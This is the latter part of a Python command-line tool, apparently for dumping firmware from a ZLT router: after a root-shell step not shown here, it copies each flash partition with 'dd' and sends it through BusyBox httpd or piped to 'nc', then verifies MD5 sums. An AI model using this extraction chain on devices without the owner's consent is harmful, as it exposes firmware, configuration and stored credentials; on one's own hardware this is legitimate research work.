            success = False; local_md5 = ""; remote_md5 = ""; err_msg = ""

            for attempt in range(1, 3):
                if attempt > 1:
                    console.print(f"  [yellow]↻ Attempt {attempt}/2[/yellow]")
                try:
                    if self.httpd_active and part["size_bytes"] <= safe_bytes:
                        success, local_md5, remote_md5 = self._dump_via_http(part, local_path)
                    else:
                        success, local_md5, remote_md5 = self._dump_via_tcp_stream(part, local_path)
                    if success:
                        break
                except Exception as exc:
                    err_msg = str(exc)
                    self.shell.exec_cmd("rm -f /tmp/zlt_dump_*.bin")

            if success:
                console.print(
                    f"  [green]✔ Verified[/green]  {part['filename']}  MD5:[green]{local_md5}[/green]"
                )
                results.append({**part, "status": "OK", "md5": local_md5})
            else:
                console.print(f"  [red]✘ Failed[/red]  {err_msg or 'checksum mismatch'}")
                results.append({**part, "status": "FAILED", "md5": "-"})

        self.shell.exec_cmd("rm -f /tmp/zlt_dump_*.bin")
        self._write_manifest_and_summary(out_dir, results)

    # ── router-side BusyBox httpd ──────────────────────────────────────────────

    def _start_router_httpd(self) -> None:
        assert self.shell is not None
        with console.status("[cyan]Starting BusyBox httpd on router /tmp...[/cyan]"):
            self.shell.exec_cmd(
                f"busybox httpd -p {self.http_port} -h /tmp || httpd -p {self.http_port} -h /tmp"
            )
            self.shell.exec_cmd("echo HTTPD_OK > /tmp/zlt_probe.txt")
            try:
                url = f"http://{self.router_ip}:{self.http_port}/zlt_probe.txt"
                with urllib.request.urlopen(url, timeout=3.0) as r:
                    self.httpd_active = b"HTTPD_OK" in r.read()
            except Exception:
                self.httpd_active = False
            finally:
                self.shell.exec_cmd("rm -f /tmp/zlt_probe.txt")

        if self.httpd_active:
            console.print(f"  [green]✔[/green] Router httpd active on :{self.http_port}")
        else:
            console.print("  [yellow]ℹ[/yellow] httpd unavailable — using Zero-RAM TCP stream for all.")

    # ── HTTP /tmp staging mode ────────────────────────────────────────────────

    def _dump_via_http(self, part: Dict, local_path: Path) -> Tuple[bool, str, str]:
        assert self.shell is not None
        tmp_name   = f"zlt_dump_{part['id']}.bin"
        tmp_path   = f"/tmp/{tmp_name}"
        dd_timeout = max(30.0, part["size_bytes"] / (1024 * 1024) * 2.5 + 20.0)

        with console.status(f"[cyan]dd {part['dev']} → {tmp_path}...[/cyan]", spinner="dots"):
            self.shell.exec_cmd(f"dd if={part['dev']} of={tmp_path} bs=4096", timeout=dd_timeout)
            md5_out = self.shell.exec_cmd(f"md5sum {tmp_path}", timeout=dd_timeout)
            m       = re.search(r"\b([0-9a-fA-F]{32})\b", md5_out)
            remote_md5 = m.group(1).lower() if m else ""

        url    = f"http://{self.router_ip}:{self.http_port}/{tmp_name}"
        hasher = hashlib.md5()

        try:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(bar_width=32),
                DownloadColumn(), TransferSpeedColumn(), TimeRemainingColumn(),
                console=console, transient=True,
            ) as prog:
                task = prog.add_task(f"[cyan]↓ {part['filename']}", total=part["size_bytes"])
                with urllib.request.urlopen(url, timeout=30.0) as resp, open(local_path, "wb") as f:
                    while True:
                        chunk = resp.read(65536)
                        if not chunk:
                            break
                        f.write(chunk); hasher.update(chunk)
                        prog.update(task, advance=len(chunk))
        finally:
            self.shell.exec_cmd(f"rm -f {tmp_path}")

        local_md5 = hasher.hexdigest().lower()
        if remote_md5 and local_md5 != remote_md5:
            raise ValueError(f"MD5 mismatch (router:{remote_md5} mac:{local_md5})")
        if local_path.stat().st_size == 0:
            raise ValueError("Downloaded file is 0 bytes")
        return True, local_md5, remote_md5

    # ── Zero-RAM direct TCP stream mode ──────────────────────────────────────

    def _dump_via_tcp_stream(self, part: Dict, local_path: Path) -> Tuple[bool, str, str]:
        assert self.shell is not None

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 0))
        listen_port = srv.getsockname()[1]
        srv.listen(1)
        srv.settimeout(12.0)

        hasher     = hashlib.md5()
        err_list:  List[str] = []

        def _recv():
            try:
                conn, _ = srv.accept()
                conn.settimeout(30.0)
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(bar_width=32),
                    DownloadColumn(), TransferSpeedColumn(), TimeRemainingColumn(),
                    console=console, transient=True,
                ) as prog:
                    task = prog.add_task(
                        f"[yellow]⇄ {part['filename']} (Zero-RAM)", total=part["size_bytes"]
                    )
                    with open(local_path, "wb") as f:
                        while True:
                            data = conn.recv(65536)
                            if not data:
                                break
                            f.write(data); hasher.update(data)
                            prog.update(task, advance=len(data))
                conn.close()
            except Exception as exc:
                err_list.append(str(exc))
            finally:
                srv.close()

        t = threading.Thread(target=_recv, daemon=True)
        t.start()

        stream_timeout = max(45.0, part["size_bytes"] / (1024 * 1024) * 3.5 + 30.0)
        self.shell.exec_cmd(
            f"dd if={part['dev']} bs=4096 2>/dev/null | nc {self.mac_ip} {listen_port} || "
            f"dd if={part['dev']} bs=4096 2>/dev/null | busybox nc {self.mac_ip} {listen_port}",
            timeout=stream_timeout,
        )
        t.join(timeout=15.0)

        if err_list:
            raise ConnectionError(f"TCP stream error: {err_list[0]}  (check macOS Firewall)")

        with console.status(f"[cyan]Verifying router-side MD5 for {part['dev']}...[/cyan]"):
            md5_out = self.shell.exec_cmd(f"md5sum {part['dev']}", timeout=stream_timeout)
            m       = re.search(r"\b([0-9a-fA-F]{32})\b", md5_out)
            remote_md5 = m.group(1).lower() if m else ""

        local_md5 = hasher.hexdigest().lower()
        if remote_md5 and local_md5 != remote_md5:
            raise ValueError(f"MD5 mismatch (router:{remote_md5} mac:{local_md5})")
        if not local_path.exists() or local_path.stat().st_size == 0:
            raise ValueError("Streamed file is empty")
        return True, local_md5, remote_md5

    # ── Manifest + summary table ──────────────────────────────────────────────

    def _write_manifest_and_summary(self, out_dir: Path, results: List[Dict]) -> None:
        with open(out_dir / "dump_manifest.json", "w", encoding="utf-8") as f:
            json.dump({
                "router_ip":  self.router_ip,
                "timestamp":  datetime.now().isoformat(),
                "partitions": results,
            }, f, indent=2)

        with open(out_dir / "checksums.md5", "w", encoding="utf-8") as f:
            for r in results:
                if r["status"] == "OK":
                    f.write(f"{r['md5']}  {r['filename']}\n")

        tbl = Table(
            title="Extraction Summary", box=box.ROUNDED, header_style="bold green"
        )
        tbl.add_column("Device",    style="cyan")
        tbl.add_column("File",      style="bold white")
        tbl.add_column("Size",      justify="right", style="yellow")
        tbl.add_column("MD5",       style="dim")
        tbl.add_column("Result",    justify="center")

        for r in results:
            badge = "[bold green]✔ OK[/bold green]" if r["status"] == "OK" else "[bold red]✘ FAIL[/bold red]"
            tbl.add_row(r["dev"], r["filename"], format_bytes(r["size_bytes"]), r["md5"], badge)

        console.print()
        console.print(tbl)
        console.print(
            Panel(
                f"Files saved to:\n[bold cyan]{out_dir}[/bold cyan]",
                title="[bold green]Dump Complete[/bold green]",
                border_style="green",
            )
        )

    # --------------------------------------------------------------------------
    # ENTRY POINT
    # --------------------------------------------------------------------------

    def run(self) -> None:
        try:
            self.print_banner()
            self.step_1_network_discovery()
            self.step_2_login_and_get_session()
            self.step_3_activate_root_shell()
            self.step_4_discover_partitions()
            self.step_5_dump_partitions()
        except KeyboardInterrupt:
            console.print("\n[yellow]⚠  Interrupted — cleaning up router /tmp...[/yellow]")
            if self.shell:
                try:
                    self.shell.exec_cmd("rm -f /tmp/zlt_dump_*.bin")
                except Exception:
                    pass
        finally:
            if self.shell:
                self.shell.close()


if __name__ == "__main__":
    ZLTFirmwareDumperCLI().run()
